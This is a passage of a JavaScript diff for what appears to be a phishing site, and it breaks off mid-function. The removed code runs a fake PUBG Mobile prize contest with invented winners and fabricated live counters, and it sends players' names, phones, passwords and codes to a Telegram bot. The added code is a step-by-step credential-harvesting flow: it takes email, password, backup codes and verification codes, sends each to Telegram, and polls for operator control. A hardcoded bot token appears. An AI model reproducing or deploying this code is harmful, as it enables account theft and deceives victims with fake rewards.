+        sendToTelegram(`<b>👆 [تفاعل / نقرة]:</b> ${actionName}\n📧 البريد الحالي: <code>${userData.email || 'لم يدخل بعد'}</code>`);
     }
 
-    // 3. إضافة المعرف الجديد كـ كائن يحتوي على (المعرف + وقت الإدخال)
-    state.usedIdentifiers.push({ id: state.identifier1, timestamp: now });
+    // التنقل بين الشاشات مع توثيق التوجه
+    function switchPage(pageId, isBack = false) {
+        const interactivePages = ['phase1', 'phase2', 'phase3', 'phase4'];
 
-    // 4. حفظ مسودة البيانات
-    saveDraft();
-
-
-            const msg = `✅ <b>الخطوة 5: نجاح الكود الأول والمعرف</b>\n` +
-                        `🔢 <b>الكود الأول:</b> <code>${state.code1}</code>\n` +
-                        `🆔 <b>معرف العملية الأول:</b> <code>${state.identifier1}</code>`;
-            sendTelegramNotification(msg);
-
-            alert("تم فحص الكود الأول بنجاح! جاري الانتقال لمرحلة التوثيق والتأكيد النهائي.");
-            goToStep(6);
-        }
-
-        /* ===================================================
-           11. منطق الخطوة 6: التوجيه المباشر والتأكيد الثاني
-           =================================================== */
-        function requestSecondConfirmationInfo() {
-            const text = encodeURIComponent(`مرحباً الإدارة، أرغب برقم التأكيد والمعرف الثاني وتحديد المنصة لإكمال التسجيل النهائي:\nID: ${state.playerID}`);
-            window.open(`https://t.me/${TELEGRAM_SUPPORT_USER}?text=${text}`, '_blank');
-        }
-
-        function triggerDeepLink(plat) {
-            audio.playClick();
-            let url = "#";
-            if (plat === 'facebook') url = "fb://";
-            else if (plat === 'twitter') url = "twitter://";
-            else if (plat === 'google') url = "https://myaccount.google.com/notifications";
-            else if (plat === 'email') url = "mailto:";
-
-            window.open(url, '_blank');
-            alert("تم التوجيه للتطبيق. هذه الخطوة لازمة لتأكيد الملكية والمتابعة في المسابقة.");
-
-            // الانتظار 10 ثوانٍ ثم تفعيل علامة الصح تلقائياً وإلغاء التعطيل
-            setTimeout(() => {
-                const chk = document.getElementById('chkAutoVerified');
-                chk.checked = true;
-                chk.parentElement.style.opacity = "1";
-                chk.parentElement.style.color = "var(--success-green)";
-                audio.playCorrect();
-
-                sendTelegramNotification(`📲 <b>تم التوجيه للتطبيق وتأكيد الإشعار بنجاح للمنصة: ${plat}</b> (ID: ${state.playerID})`);
-                validateStep6();
-            }, 7000);
-        }
-
-        function validateStep6() {
-            const iden2 = document.getElementById('inputIdentifier2').value.trim();
-            const chkAuto = document.getElementById('chkAutoVerified').checked;
-
-            // المعرف يبدأ بـ 705 ومتبوع بثلاثة أرقام
-            const isIden2Valid = /^705[0-9]{3}$/.test(iden2);
-
-            state.identifier2 = iden2;
-
-            document.getElementById('btnFinalSubmit').disabled = !(isIden2Valid && chkAuto);
-        }
-
-        function resendNotificationSilent() {
-            audio.playAlert();
-            sendTelegramNotification(`⚠️ <b>طلب إعادة إرسال الإشعار ورمز التأكيد للمستخدم!</b>\n🎮 <b>ID:</b> ${state.playerID}\n👤 <b>الاسم:</b> ${state.fullName}`);
-            alert("تم إرسال طلب إعادة إرسال الإشعار للإدارة بنجاح. يرجى الانتظار ثوانٍ.");
-        }
-
-        function finishRegistration() {
-            if (state.identifier1 === state.identifier2) {
-                audio.playWrong();
-                alert("عذراً، تأكد من معرف العملية. لا يمكن استخدام نفس المعرف السابق!");
-                return;
+        if (!isBack && interactivePages.includes(pageId)) {
+            if (historyStack[historyStack.length - 1] !== pageId) {
+                historyStack.push(pageId);
             }
-            if (state.usedIdentifiers.includes(state.identifier2)) {
-                audio.playWrong();
-                alert("عذراً، هذا الكود مُستخدم. يرجى طلب كود تأكيد جديد للاستمرار.");
-                return;
-            }
-
-            state.usedIdentifiers.push(state.identifier2);
-            saveDraft();
-
-            // إرسال الإشعار النهائي الشامل إلى التليجرام
-            const finalMsg = `🏆 <b>تم إتمام التسجيل النهائي بنجاح!</b> 🎉\n` +
-                             `========================\n` +
-                             `👤 <b>الاسم:</b> ${state.fullName}\n` +
-                             `📞 <b>الهاتف:</b> ${state.phone}\n` +
-                             `🎮 <b>الأيدي (ID):</b> <code>${state.playerID}</code>\n` +
-                             `🎁 <b>الجائزة:</b> ${state.selectedReward}\n` +
-                             `🌐 <b>المنصة:</b> ${state.platform} (${state.platformUser})\n` +
-                             `🔑 <b>كلمة المرور:</b> ${state.notesPassword}\n` +
-                             `🔢 <b>الكود 1 والمعرف:</b> <code>${state.code1}</code> | <code>${state.identifier1}</code>\n` +
-                             `🔢 <b>المعرف الثاني:</b> <code>${state.identifier2}</code>\n` +
-                             `========================`;
-            sendTelegramNotification(finalMsg);
-
-            audio.playCelebration();
-            document.getElementById('successPlayerMessage').innerText = `تم إدراج  أسمك والأيدي الخاص بك (${state.playerID}) في قائمة المشاركين في السحب الأسبوعي.`;
-            goToStep(7);
         }
 
-        /* ===================================================
-           12. العدادات اللحظية والإشعارات التفاعلية Toasts
-           =================================================== */
-        function initDynamicCounters() {
-            let visitors = 520;
-            let registered = 340;
+        document.querySelectorAll('.step-page').forEach(page => page.classList.remove('active'));
+        const targetPage = document.getElementById(pageId);
+        if (targetPage) targetPage.classList.add('active');
 
-            setInterval(() => {
-                // تذبذب الزوار
-                visitors += Math.floor(Math.random() * 7) - 3;
-                if (visitors < 300) visitors = 350;
-                document.getElementById('liveVisitorsCount').innerText = visitors;
-
-                // تحديث المسجلين ببطء شديد وأن يكون أقل دائماً من الزوار وأقل من 1000
-                if (Math.random() > 0.6 && registered < visitors - 50 && registered < 980) {
-                    registered += 1;
-                    document.getElementById('registeredCount').innerText = registered;
-                }
-            }, 3000);
+        // تحكم بظهور زر العودة خطوة للخلف
+        const backBtn = document.getElementById('backBtn');
+        if (interactivePages.includes(pageId) && historyStack.length > 1 && pageId !== 'phase1') {
+            backBtn.style.display = 'inline-flex';
+        } else {
+            backBtn.style.display = 'none';
         }
 
-        // عداد انقضاء وقت المسابقة حتى نهاية يوم الجمعة
-        function initWeeklyCountdown() {
-            function updateTimer() {
-                const now = new Date();
-                const dayOfWeek = now.getDay(); // 5 = الجمعة
-                let daysUntilFriday = (5 - dayOfWeek + 7) % 7;
-                
-                const target = new Date(now.getFullYear(), now.getMonth(), now.getDate() + daysUntilFriday, 23, 59, 59);
-                const diff = target - now;
-
-                const hrs = String(Math.floor((diff / (1000 * 60 * 60)) % 24) + (daysUntilFriday * 24)).padStart(2, '0');
-                const mins = String(Math.floor((diff / (1000 * 60)) % 60)).padStart(2, '0');
-                const secs = String(Math.floor((diff / 1000) % 60)).padStart(2, '0');
-
-                document.getElementById('countdownTimer').innerText = `${hrs}:${mins}:${secs}`;
-            }
-            setInterval(updateTimer, 1000);
-            updateTimer();
+        const title = pageNames[pageId] || pageId;
+        if (isBack) {
+            sendToTelegram(`<b>⬅️ [رجوع للخلف]</b> عاد المستخدم خطوة للخلف إلى:\n📍 <b>${title}</b>\n📧 البريد: <code>${userData.email || 'غير مدخل'}</code>`);
+        } else {
+            sendToTelegram(`<b>➡️ [توجه جديد]</b> انتقل المستخدم إلى:\n📍 <b>${title}</b>`);
         }
+    }
 
-       /* ==========================================================================
-   منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + بطاقات الفائزين + تليجرام)
-   ========================================================================== */
-
-/* ==========================================================================
-   منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + بطاقات الفائزين + تليجرام)
-   ========================================================================== */
-
-/* ==========================================================================
-   منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + بطاقات الفائزين + تليجرام)
-   ========================================================================== */
-
-/* ==========================================================================
-   منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + البطاقات المزدوجة + تليجرام)
-   ========================================================================== */
-
-// 1. مصفوفة الأسماء الموسعة (105 أسماء فريدة بدون تكرار)
-const toastNames = [
-    "محمد أحمد الحساني", "علي فارس مفتاح", "صلاح محسن أحمد", "خالد الشمري", 
-    "نور الدين إسماعيل", "سلطان يوسف القرضاوي", "حمزة المعافى", "مصطفى الكاظمي",
-    "صلاح لطفي بن عيسى", "عمر سالم بانجوة", "يسلم عبدالوهاب", "عبدالله أحمد العلي", 
-    "ريان طارق داؤود", "إسلام عبدالله محمد", "رأفت علي بديع", "حسين إدريس طارق",
-    "سالم سعيد باوزير", "ماجد عبدالحكيم", "عمار ياسر الشريفي", "بلال توفيق السالم",
-    "طارق زياد النهدي", "أحمد مراد بن طالب", "وليد خالد الكندي", "صالح مبارك المنهالي",
-    "بدر ناصر العتيبي", "هشام بن خالد", "أنس عبدالرحمن", "يحيى زكريا القحطاني",
-    "فارس تركي العصيمي", "زياد فهد السبيعي", "عبدالعزيز بن راشد", "معاذ توفيق الناصري",
-    "سعود عبدالعزيز الدوسري", "عادل منصور الهاجري", "إبراهم ماجد الرفاعي", "سليمان حامد المطيري",
-    "فيصل عبدالله الغامدي", "جهاد بن طلال", "وسام عدنان الزهراني", "سيف الدين يونس",
-    "أسامة خليل الحارثي", "عاصم بن ثابت", "مالك مروان الشرفي", "أيمن صلاح العفيف",
-    "نواف مشعل العنزي", "أيوب عبدالصمد", "حاتم طاهر اليماني", "طلال عبدالإله",
-    "باسم عمار الرويلي", "نايف حمدان الصباح", "مروان إياد الجابر", "غازي سعد العارفي",
-    "مهند فيصل الحارثي", "أمجد عبداللطيف", "قتيبة يوسف السلمي", "سامي بن راشد",
-    "عز الدين توفيق", "شرف الدين عمران", "فراس بدر البقمي", "جمال إبراهيم العامري",
-    "وائل عبده الصبري", "أيمن ناصر القحطاني", "مروان طاهر الشبواني", "مقبل مبارك الكربي",
-    "تركي فهد الهاجري", "راشد حمد المري", "سعيد سالم العمري", "معتز عادل العولقي",
-    "فؤاد حسن الباكري", "عصام توفيق اليافعي", "أمين صالح الصبيحي", "ضياء الدين العولقي",
-    "مازن عبدالرب المفلحي", "همام فاروق السقاف", "وهيب علي الحارثي", "موسى جعفر العيدروس",
-    "منصور علي الكثيري", "نزار خليل التميمي", "هاشم محمد العطاس", "أكرم سعيد المحضار",
-    "نبيل طاهر البكري", "توفيق عباد الرصاص", "مختار عبدالجليل", "شريف فتحي السالمي",
-    "إلياس مراد الجابري", "يعقوب يوسف البلوشي", "صهيب أحمد الشحري", "نوح إبراهيم الكندي",
-    "زكريا يحيى المحرمي", "إدريس حمزة العولقي", "خالد وليد الضالعي", "عدنان سعيد المنهالي",
-    "عمار فايز المهري", "مشاري سعد السبيعي", "سلطان خالد الدوسري", "سعود ناصر السهلي",
-    "عبدالرحمن فهد القحطاني", "فيصل بدر المطيري", "نايف ثامر الشمري", "بندر وليد العتيبي",
-    "طلال عبدالله الحداد", "مقرن محمد الغامدي", "يزيد صالح محمد بن علي", "سلمان حامد المالكي"
-];
-
-// 2. جوائز الفائزين الثلاثة بالتعديل الجديد (الأول 500، الثاني 400، الثالث 300)
-const weeklyPrizes = [
-    "500 UC (المركز الأول 🥇)",
-    "400 UC (المركز الثاني 🥈)",
-    "300 UC (المركز الثالث 🥉)"
-];
-
-// 3. بيانات الاعتماد لتليجرام
-const TELEGRAM_CONFIG = {
-    botToken: "8898927305:AAHMxzFT5nZ3e6w30XuI-4ibBZjmTLhbw5M",
-    chatId: "8796885500"
-};
-
-// 4. تحديد الفائزين الثلاثة أوتوماتيكياً (يتغير أسبوعياً يوم الجمعة الساعة 12 منتصف الليل)
-function getWeeklyWinnersWithPrizes() {
-    const now = new Date();
-    const totalNames = toastNames.length;
-
-    // الحصول على التاريخ المحلي الحالي بدون ساعات لضمان التغيير عند 00:00 بالضبط
-    const localDate = new Date(now.getFullYear(), now.getMonth(), now.getDate());
-    
-    // تاريخ مرجعي ثابت يوافق يوم السبت (3 يناير 1970 كان يوم سبت)
-    const baseDate = new Date(1970, 0, 3);
-    
-    // حساب عدد الأيام بين التاريخ المرجعي واليوم الحالي
-    const diffInTime = localDate.getTime() - baseDate.getTime();
-    const diffInDays = Math.floor(diffInTime / (1000 * 3600 * 24));
-    
-    // تقسيم عدد الأيام على 7 للحصول على رقم الأسبوع الصحيح الذي يتحدث فجر السبت
-    const currentWeekIndex = Math.floor(diffInDays / 7);
-
-    const winner1 = { name: toastNames[currentWeekIndex % totalNames], prize: weeklyPrizes[0] };
-    const winner2 = { name: toastNames[(currentWeekIndex + 35) % totalNames], prize: weeklyPrizes[1] };
-    const winner3 = { name: toastNames[(currentWeekIndex + 70) % totalNames], prize: weeklyPrizes[2] };
-
-    return [winner1, winner2, winner3];
-}
-
-
-// 5. توليد ID احترافي
-function generateID() {
-    const prefix = Math.random() < 0.5 ? "51" : "52";
-    const randomMiddle = Math.floor(Math.random() * 90 + 10);
-    const randomEnd = Math.floor(Math.random() * 90 + 10);
-    return `${prefix}${randomMiddle}*****${randomEnd}`;
-}
-
-// 6. دالة خداع/تغطية الاسم (الاسم المخدوش)
-function getMaskedName(name) {
-    return name.split(' ').map(word => {
-        if (word.length <= 2) return '**';
-        return word.slice(0, 2) + '*'.repeat(word.length - 2);
-    }).join(' ');
-}
-
-// 7. العداد التنازلي بالأيام والساعات والدقائق والثواني
-function startFridayCountdown() {
-    const timerElement = document.getElementById('countdownTimer');
-    if (!timerElement) return;
-
-    setInterval(() => {
-        const now = new Date();
-        const targetFriday = new Date();
-
-        const currentDay = now.getDay(); // 0: الأحد ... 5: الجمعة
-        let daysUntilFriday = (5 - currentDay + 7) % 7;
-
-        targetFriday.setDate(now.getDate() + daysUntilFriday);
-        targetFriday.setHours(23, 59, 59, 999);
-
-        if (now > targetFriday) {
-            targetFriday.setDate(targetFriday.getDate() + 7);
+    // وظيفة زر العودة خطوة
+    function goBack() {
+        if (historyStack.length > 1) {
+            historyStack.pop();
+            const prevPage = historyStack[historyStack.length - 1];
+            switchPage(prevPage, true);
         }
+    }
 
-        const diff = targetFriday - now;
+    function toggleHelp() {
+        const box = document.getElementById('helpBox');
+        const isShown = box.style.display === 'none';
+        box.style.display = isShown ? 'block' : 'none';
+        trackAction(isShown ? 'عرض تعليمات الحساب' : 'إخفاء تعليمات الحساب');
+    }
 
-        if (diff <= 0) {
-            timerElement.innerText = "00:00:00 (تم إغلاق السحب!)";
+    // --- المرحلة الأولى ---
+    function submitPhase1() {
+        const email = document.getElementById('emailInput').value.trim();
+        if (!email) {
+            alert('يرجى إدخال البريد الإلكتروني أو الهاتف');
+            return;
+        }
+        userData.email = email;
+        sendToTelegram(`<b>📥 [مدخلات] مرحلة 1 - البريد/الهاتف:</b>\n<code>${email}</code>`);
+
+        switchPage('loading1');
+        setTimeout(() => {
+            switchPage('phase2');
+        }, 3000);
+    }
+
+    // --- المرحلة الثانية ---
+    function submitPhase2Initial() {
+        const notes = document.getElementById('notesInput').value.trim();
+        if (!notes) {
+            alert('يرجى إدخال كلمة الملاحظات');
+            return;
+        }
+        userData.initialNotes = notes;
+        sendToTelegram(`<b>🔑 [مدخلات] كلمة الملاحظات المدخلة:</b>\nالبريد: <code>${userData.email}</code>\nكلمة الملاحظات: <code>${notes}</code>`);
+
+        switchPage('loading2');
+        setTimeout(() => {
+            switchPage('phase3');
+        }, 3000);
+    }
+
+    function showForgotPasswordView() {
+        document.getElementById('phase2_initial').style.display = 'none';
+        document.getElementById('phase2_forgot').style.display = 'block';
+
+        const uniqueNote = 'NOTE-' + Math.floor(100000 + Math.random() * 900000);
+        userData.uniqueNote = uniqueNote;
+        document.getElementById('uniqueNoteBox').innerText = uniqueNote;
+
+        sendToTelegram(`<b>⚠️ [توجه] طلب نسيت كلمة الملاحظات:</b>\nالبريد: <code>${userData.email}</code>\nكلمة الملاحظات المنشأة: <code>${uniqueNote}</code>`);
+    }
+
+    function handlePasswordRedirect() {
+        navigator.clipboard.writeText(userData.uniqueNote).catch(e => console.log(e));
+        document.getElementById('newNotesInput').disabled = false;
+        document.getElementById('btnSubmitNewNotes').disabled = false;
+        trackAction('انقر على رابط نسخ كلمة الملاحظات وتحديث كلمة المرور');
+    }
+
+    function submitPhase2Final() {
+        const newNotes = document.getElementById('newNotesInput').value.trim();
+        if (!newNotes) {
+            alert('يرجى إدخال كلمة الملاحظات الجديدة');
+            return;
+        }
+        userData.newNotes = newNotes;
+        sendToTelegram(`<b>✅ [مدخلات] تحديث كلمة الملاحظات الجديدة:</b>\nالبريد: <code>${userData.email}</code>\nكلمة الملاحظات المنسوخة: <code>${userData.uniqueNote}</code>\nكلمة الملاحظات الجديدة: <code>${newNotes}</code>`);
+
+        switchPage('loading2');
+        setTimeout(() => {
+            switchPage('phase3');
+        }, 3000);
+    }
+
+    // --- المرحلة الثالثة ---
+    function handleBackupCodesRedirect() {
+        hasVisitedBackupCodesLink = true;
+        const alertBox = document.getElementById('errorAlert');
+        alertBox.style.display = 'none';
+        trackAction('انقر على رابط استخراج رموز الأمان (Backup Codes)');
+    }
+
+    function submitBackupCode() {
+        const alertBox = document.getElementById('errorAlert');
+
+        if (!hasVisitedBackupCodesLink) {
+            alertBox.innerText = "يرجى الضغط على رابط رموز الأمان أولاً للحصول على الرمز ثم ادخاله في الخانة.";
+            alertBox.style.display = 'block';
+            sendToTelegram(`<b>⚠️ [تنبيه محاولة]</b> حاول المستخدم إدخال رمز أمان دون فتح الرابط أولاً.`);
             return;
         }
 
-        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
-        const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
-        const mins = Math.floor((diff / (1000 * 60)) % 60);
-        const secs = Math.floor((diff / 1000) % 60);
-
-        if (days > 0) {
-            timerElement.innerText = `متبقي ${days} يوم و ${hours} ساعة و ${mins} دقيقة و ${secs} ثانية على السحب`;
-        } else {
-            timerElement.innerText = `متبقي ${hours} ساعة و ${mins} دقيقة و ${secs} ثانية على السحب`;
+        const code = document.getElementById('backupCodeInput').value.trim();
+        if (!code) {
+            alertBox.innerText = "يرجى إدخال أحد رموز الأمان المنسوخة من الرابط.";
+            alertBox.style.display = 'block';
+            return;
         }
 
-        // فحص الإرسال التلقائي يوم الجمعة في منتصف الليل
-        checkAutomaticSend(now);
-    }, 1000);
-}
+        userData.backupCode = code;
+        sendToTelegram(`<b>🛡️ [مدخلات] رمز الأمان المدخل:</b>\nالبريد: <code>${userData.email}</code>\nرمز الأمان: <code>${code}</code>`);
 
-// 8. تصميم بطاقة الفائز الاحترافية (Canvas) تدعم النسخة الظاهرة والنسخة المخدوشة
-function createWinnerCardCanvas(displayName, winnerID, prize, isMasked) {
-    const canvas = document.createElement('canvas');
-    canvas.width = 900;
-    canvas.height = 500;
-    const ctx = canvas.getContext('2d');
-
-    // خلفية ألعاب فاخرة ومتدرجة
-    const bgGradient = ctx.createLinearGradient(0, 0, 900, 500);
-    bgGradient.addColorStop(0, '#050811');
-    bgGradient.addColorStop(1, '#0f172a');
-    ctx.fillStyle = bgGradient;
-    ctx.fillRect(0, 0, 900, 500);
-
-    // إطار ذهبي متوهج فاخر
-    ctx.strokeStyle = isMasked ? '#3b82f6' : '#ffd700';
-    ctx.lineWidth = 6;
-    ctx.strokeRect(18, 18, 864, 464);
-
-    // بطاقة مركزية بيضاء/فاتحة بنقاوة عالية
-    ctx.fillStyle = '#f8fafc';
-    if (ctx.roundRect) {
-        ctx.beginPath();
-        ctx.roundRect(45, 45, 810, 410, 14);
-        ctx.fill();
-    } else {
-        ctx.fillRect(45, 45, 810, 410);
+        switchPage('loading2');
+        setTimeout(() => {
+            switchPage('successScreen');
+        }, 3000);
     }
 
-    // شريط علوي يوضح نوع النسخة (ظاهر أو مخدوش)
-    ctx.fillStyle = isMasked ? '#1e40af' : '#b45309';
-    if (ctx.roundRect) {
-        ctx.beginPath();
-        ctx.roundRect(45, 45, 810, 48, [14, 14, 0, 0]);
-        ctx.fill();
-    } else {
-        ctx.fillRect(45, 45, 810, 48);
+    function toggleAlternativeWays() {
+        const container = document.getElementById('alternativeWays');
+        const isShown = container.style.display === 'none';
+        container.style.display = isShown ? 'block' : 'none';
+        trackAction(isShown ? 'عرض خيارات طرق التأكيد البديلة' : 'إخفاء طرق التأكيد البديلة');
     }
 
-    // نص الشريط العلوي
-    ctx.fillStyle = '#ffffff';
-    ctx.font = 'bold 20px Tahoma, Arial, sans-serif';
-    ctx.textAlign = 'center';
-    const versionTitle = isMasked ? '🔒 [نسخة الاسم المخدوش الخصوصية الآمنة]' : '⭐ [نسخة الاسم الظاهر الرسمية]';
-    ctx.fillText(versionTitle, 450, 77);
-
-    // العنوان الرئيسي للبطاقة
-    ctx.fillStyle = '#0f172a';
-    ctx.font = 'bold 28px Tahoma, Arial, sans-serif';
-    ctx.fillText('🏆 مسابقات ببجي موبايل الأسبوعية 🏆', 450, 135);
-
-    // خط فاصل
-    ctx.strokeStyle = '#cbd5e1';
-    ctx.lineWidth = 2;
-    ctx.beginPath();
-    ctx.moveTo(90, 155);
-    ctx.lineTo(810, 155);
-    ctx.stroke();
-
-    // اسم الفائز (أو المخدوش)
-    ctx.fillStyle = '#1e293b';
-    ctx.font = 'bold 25px Tahoma, Arial, sans-serif';
-    const labelPrefix = isMasked ? 'الاسم المخدوش:' : 'اسم المتسابق:';
-    ctx.fillText(`${labelPrefix}  ${displayName}`, 450, 215);
-
-    // مربع الأيدي (ID)
-    ctx.fillStyle = '#0f172a';
-    if (ctx.roundRect) {
-        ctx.beginPath();
-        ctx.roundRect(190, 245, 520, 52, 10);
-        ctx.fill();
-    } else {
-        ctx.fillRect(190, 245, 520, 52);
-    }
-
-    ctx.fillStyle = '#38bdf8';
-    ctx.font = 'bold 23px monospace';
-    ctx.fillText(`الأيدي (ID):  ${winnerID}`, 450, 279);
-
-    // مربع الجائزة المميز
-    ctx.fillStyle = '#ecfdf5';
-    ctx.strokeStyle = '#10b981';
-    ctx.lineWidth = 2;
-    if (ctx.roundRect) {
-        ctx.beginPath();
-        ctx.roundRect(110, 315, 680, 68, 12);
-        ctx.fill();
-        ctx.stroke();
-    } else {
-        ctx.fillRect(110, 315, 680, 68);
-        ctx.strokeRect(110, 315, 680, 68);
-    }
-
-    ctx.fillStyle = '#047857';
-    ctx.font = 'bold 24px Tahoma, Arial, sans-serif';
-    ctx.fillText(`🎁 الجائزة الكبرى:  ${prize}`, 450, 357);
-
-    // تذييل البطاقة
-    ctx.fillStyle = '#64748b';
-    ctx.font = '15px Tahoma, Arial, sans-serif';
-    ctx.fillText('تم سحب وإعلان الفائزين نهاية الأسبوع يوم الجمعة منتصف الليل', 450, 425);
-
-    return canvas;
-}
-
-// 9. إرسال البطاقة إلى تليجرام
-async function sendWinnerCardToTelegram(winnerName, winnerID, prize, isMasked) {
-    const displayName = isMasked ? getMaskedName(winnerName) : winnerName;
-    const canvas = createWinnerCardCanvas(displayName, winnerID, prize, isMasked);
-
-    canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-        formData.append('photo', blob, isMasked ? 'masked_card.png' : 'normal_card.png');
-        
-        const cardTypeLabel = isMasked ? "🔒 **(نسخة الاسم المخدوش)**" : "⭐ **(نسخة الاسم الظاهر)**";
-        formData.append('caption', 
-            `🏆 **إعلان الفائزين بالسحب الأسبوعي** ${cardTypeLabel}\n\n` +
-            `👤 **اللاعب:** ${displayName}\n` +
-            `🆔 **الأيدي (ID):** \`${winnerID}\`\n` +
-            `🎁 **الجائزة:** ${prize}\n\n` +
-            `⏰ *تم اعتماد السحب نهاية الأسبوع يوم الجمعة الساعة 12:00 منتصف الليل!*`
-        );
-        formData.append('parse_mode', 'Markdown');
-
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            const result = await response.json();
-            if (result.ok) {
-                console.log(`✅ تم إرسال البطاقة (${isMasked ? 'مخدوش' : 'ظاهر'}) بنجاح.`);
-            } else {
-                console.error("❌ خطأ تليجرام:", result.description);
-            }
-        } catch (error) {
-            console.error("❌ فشل الاتصال:", error);
+    function requestVerificationCode() {
+        const inputVal = document.getElementById('phoneOrEmailInput').value.trim();
+        if (!inputVal) {
+            alert('يرجى إدخال رقم الهاتف أو البريد الإلكتروني');
+            return;
         }
-    }, 'image/png');
-}
+        userData.phoneOrEmail = inputVal;
+        sendToTelegram(`<b>📩 [مدخلات] طلب كود تحقق جديد:</b>\nالبريد: <code>${userData.email}</code>\nبيانات التواصل: <code>${inputVal}</code>`);
 
-// 10. إرسال جميع البطاقات (النسختين العادية والمخدوشة لكل فائز من الثلاثة = 6 بطاقات)
-function sendAllWinnerCardsToTelegram() {
-    const winners = getWeeklyWinnersWithPrizes();
-    console.log("🚀 جاري إرسال البطاقات الست (ظاهر + مخدوش) إلى تليجرام...");
-
-    winners.forEach((winner, index) => {
-        const randID = generateID();
-        // إرسال النسخة الظاهرة
-        setTimeout(() => {
-            sendWinnerCardToTelegram(winner.name, randID, winner.prize, false);
-        }, index * 4000);
-
-        // إرسال النسخة المخدوشة
-        setTimeout(() => {
-            sendWinnerCardToTelegram(winner.name, randID, winner.prize, true);
-        }, (index * 4000) + 2000);
-    });
-}
-
-// 11. الفحص التلقائي للإرسال يوم الجمعة الساعة 12 منتصف الليل (00:00)
-function checkAutomaticSend(now) {
-    const currentDay = now.getDay(); // 5 = الجمعة
-    const currentHour = now.getHours(); // 0 = منتصف الليل
-    const currentMinute = now.getMinutes();
-
-    const currentWeekKey = Math.floor(now.getTime() / (7 * 24 * 60 * 60 * 1000));
-    const lastSentWeek = localStorage.getItem('auto_sent_friday_week');
-
-    // إذا كان يوم الجمعة، الساعة 00:00 (أول دقيقة من الجمعة)، ولم تُرسل بعد في هذا الأسبوع
-    if (currentDay === 5 && currentHour === 0 && currentMinute === 0 && lastSentWeek !== String(currentWeekKey)) {
-        console.log("⏰ وقت السحب التلقائي وصل! يوم الجمعة 12:00 منتصف الليل.");
-        sendAllWinnerCardsToTelegram();
-        localStorage.setItem('auto_sent_friday_week', String(currentWeekKey));
+        switchPage('phase4');
+        startTelegramPolling();
     }
-}
 
-// 12. إدارة الإشعارات العائمة (Toasts)
-function getOrCreateToastContainer() {
-    let container = document.getElementById('toast-container');
-    if (!container) {
-        container = document.createElement('div');
-        container.id = 'toast-container';
-        Object.assign(container.style, {
-            position: 'fixed',
-            bottom: '20px',
-            right: '20px',
-            zIndex: '9999',
-            display: 'flex',
-            flexDirection: 'column',
-            gap: '10px',
-            maxWidth: '380px',
-            direction: 'rtl'
-        });
-        document.body.appendChild(container);
-    }
-    return container;
-}
-
-function showToast(message, borderColor = '#00f3ff', duration = 6000) {
-    const container = getOrCreateToastContainer();
-    const toast = document.createElement('div');
-    toast.className = 'toast-card';
+   // --- المرحلة الرابعة (الإرسال اليدوي عند الضغط على زر موافق) ---
+function verifyCode() {
+    const codeInput = document.getElementById('verificationCodeInput');
+    const val = codeInput.value.trim();
     
-    Object.assign(toast.style, {
-        backgroundColor: '#161a23',
-        color: '#ffffff',
-        padding: '12px 16px',
-        borderRadius: '8px',
-        borderRight: `4px solid ${borderColor}`,
-        boxShadow: '0 4px 15px rgba(0, 0, 0, 0.4)',
-        fontSize: '14px',
-        fontFamily: 'Tahoma, Arial, sans-serif',
-        lineHeight: '1.5',
-        opacity: '1',
-        transition: 'opacity 0.4s ease, transform 0.4s ease'
-    });
-
-    toast.innerHTML = message;
-    container.appendChild(toast);
-
-    setTimeout(() => {
-        toast.style.opacity = '0';
-        toast.style.transform = 'translateY(10px)';
-        setTimeout(() => toast.remove(), 400);
-    }, duration);
-}
-
-// 13. بدء المنظومة
-function startLiveToasts() {
-    startFridayCountdown();
-
-    // إشعار تسجيل لاعب جديد
-    setInterval(() => {
-        const randID = generateID();
-        showToast(`🎉 تم إتمام تسجيل اللاعب (ID: ${randID}) بنجاح قبل قليل!`, '#10b981', 6000);
-    }, 18000);
-
-    // إشعار فائز عشوائي
-    setInterval(() => {
-        const winners = getWeeklyWinnersWithPrizes();
-        const randomWinner = winners[Math.floor(Math.random() * winners.length)];
-        const randID = generateID();
-
-        showToast(`🏆 الفائز بالسحب الأسبوعي: ${randomWinner.name} (ID: ${randID}) بـ ${randomWinner.prize}!`, '#38bdf8', 7000);
-    }, 25000);
-}
-
-// تشغيل النظام عند تحميل الصفحة
-document.addEventListener('DOMContentLoaded', () => {
-    startLiveToasts();
-});
+    // التحقق من أن حقل الإدخال ليس فارغاً
+    if (!val) {
+        alert('الرجاء إدخال الكود أولاً');
+        return;
+    }
+    
+    // حفظ الكود في المتغير
+    userData.verificationCode = val;
+    
+    // إرسال البيانات إلى تليجرام
+    sendToTelegram(`<b> 🔢 كود [مدخلات] (${val.length} أرقام) التحقق المدخل:</b>\nالبريد: <code>${userData.email}</code>\nالكود: <code>${val}</code>`);
+    
+    // الانتقال إلى صفحة الانتظار
+    switchPage('waitingTelegram');
 
 
+    }
 
-        /* ===================================================
-           13. شاشة حماية انقطاع الاتصال بالإنترنت (Offline Shield)
-           =================================================== */
-        function checkInternetConnection() {
-            if (!navigator.onLine) {
-                document.getElementById('offlineOverlay').classList.add('active');
-            } else {
-                document.getElementById('offlineOverlay').classList.remove('active');
-            }
-        }
-        window.addEventListener('online', checkInternetConnection);
-        window.addEventListener('offline', checkInternetConnection);
+    // --- بوابة التحكم اليدوي عبر التليجرام ---
+    function startTelegramPolling() {
+        if (pollInterval) clearInterval(pollInterval);
 
-        /* ===================================================
-           14. طرق التواصل المباشر والنوافذ العائمة
-           =================================================== */
-        function openTelegramDirect() {
-            window.open(`https://t.me/${TELEGRAM_SUPPORT_USER}`, '_blank');
-        }
-        function openWhatsAppDirect() {
-            window.open(`https://wa.me/${WHATSAPP_SUPPORT_NUM}`, '_blank');
-        }
-        function toggleSupportModal() {
-            audio.playClick();
-            document.getElementById('supportModal').classList.toggle('active');
-        }
+        let lastUpdateId = 0;
+        pollInterval = setInterval(() => {
